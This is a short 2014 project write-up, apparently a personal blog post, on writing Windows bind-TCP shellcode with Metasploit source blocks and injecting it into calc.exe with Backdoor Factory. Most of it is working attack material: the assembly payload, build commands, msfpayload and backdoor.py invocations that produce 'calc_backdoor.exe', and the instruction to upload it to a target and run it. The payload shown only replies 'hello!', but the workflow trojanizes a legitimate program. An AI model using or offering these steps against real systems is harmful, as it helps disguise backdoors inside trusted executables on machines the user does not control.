Journeys in shellcode
---------------------
###### Tue Oct 28 22:04:54 EDT 2014

This project is about my travels in shellcode.

The main objective is to construct a simple (and I mean simple) webserver in shellcode, inject it into another executable, and let it survive happily accepting http requests and replying to all of them with a static page.

Step 1: Edit the shell code
---------------------------
metasploit-framework/external/source/shellcode/windows/x86/src/single/single_koth_bind_tcp.asm:
```asm

;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 341 bytes
; Build: >build.py single_web_bind_tcp
;-----------------------------------------------------------------------------;
[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
%include "./src/block/block_bind_tcp.asm"
  ; By here we will have performed the bind_tcp connection and EDI will be out socket.

call set_hello
hello:
 db "hello!",0x00
set_hello:
 pop ecx
 push byte 0             ; int flags
 push byte 7             ; int len
 push ecx                ; char *buf
 push edi                ; SOCKET s
 push 0x5F38EBC2         ; hash( "ws2_32.dll", "send" )
 call ebp                ; execute?

	; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"
```

Step 2: Compile the shell code into a metasploit module
-------------------------------------------------------
```bash
metasploit-framework/external/source/shellcode/windows/x86$ python build.py single_koth_bind_tcp >> ../../../../../modules/payloads/singles/windows/shell_koth_bind_tcp.rb
```

Step 3: Edit shell_koth_bind_tcp.rb
-----------------------------------
1. Fixup the PAYLOAD section
1. Fixup the LPORT offset
1. Fixup the EXITFUNC offset

Step 4: Compile the payload into an executable with Backdoor Factory
--------------------------------------------------------------------
```bash
$ msfpayload windows/shell_koth_bind_tcp LPORT=1337 EXITFUNC=thread R > /tmp/shell_bind.raw
$ bdf/backdoor.py -f /tmp/calc.exe -o calc_backdoor.exe -s user_supplied_shellcode -U /tmp/shell_bind.raw
```
Type 'append' when prompted. The resulting binary will be in `backdoored/calc_backdoor.exe`.

Upload this to the target and execute.

Known Problems
--------------
1. The server only listens to one request then it exits. I need to make it loop somehow.

